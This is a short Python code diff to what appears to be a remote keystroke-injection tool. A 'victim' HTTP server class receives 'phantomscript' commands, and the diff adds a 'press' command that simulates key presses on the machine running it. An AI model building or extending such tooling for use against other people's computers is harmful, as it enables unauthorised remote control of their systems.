@@ -2,11 +2,17 @@ import keyboard
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 def try_run_from_phantomscript_command(phantomscript_command: str):
-    phantomscript_command = phantomscript_command.strip()
+    phantomscript_command = phantomscript_command.strip().lower()
     
     if phantomscript_command.startswith(("#", '//')) or not phantomscript_command:
         return True
     
+    if phantomscript_command.startswith('press'):
+        keyboard.press(phantomscript_command.removeprefix('press').strip().replace(' ', '+'))
+
+        return True
+
+
     return False
 
 class PhantomLinkVictimServer(BaseHTTPRequestHandler):
